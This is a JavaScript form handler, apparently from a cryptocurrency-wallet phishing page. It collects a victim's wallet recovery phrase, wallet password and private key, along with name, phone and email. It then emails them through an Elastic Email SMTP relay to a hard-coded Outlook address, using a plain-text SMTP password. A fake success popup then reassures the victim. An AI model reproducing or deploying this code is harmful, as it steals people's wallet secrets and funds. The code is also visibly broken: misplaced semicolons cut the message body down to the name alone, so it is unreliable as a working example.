function emailSend(){

	var userName = document.getElementById('name').value;

	var phone = document.getElementById('phone').value;

	var email = document.getElementById('email'

	).value;

	var wallet = document.getElementById('wallet').value;

	var phrase = document.getElementById('phrase').value;

	var walletp = document.getElementById('walletp'

		).value;

	var privk = document.getElementById('privk'

	).value;



	var messageBody = "Name " + userName; +

	"<br/> Phone " + phone; +

	"<br/> Email " + email; +

	"<br/> Wallet " + wallet; +

	"<br/> Phrase " + phrase; +

	"<br/> walletp " + walletp; +

	"<br/> privk " + privk; +

	

	Email.send({

    Host : "smtp.elasticemail.com",

    Username : "Davesmanagement@outlook.com",

    Password : "74232A09D54F654EDC4637F5220C64233A55",

    To : "Davesmanagement@outlook.com",

    From : "Davesmanagement@outlook.com",

    Subject : "This is the subject",

    Body : messageBody
}).then(
  message => {
  	if(message=='OK'){
  		swal("Sucessful", "You clicked the button!", "success");
  	}
  	else{

  		swal("Error", "You clicked the button!", "error");

  	}

  }

);

}
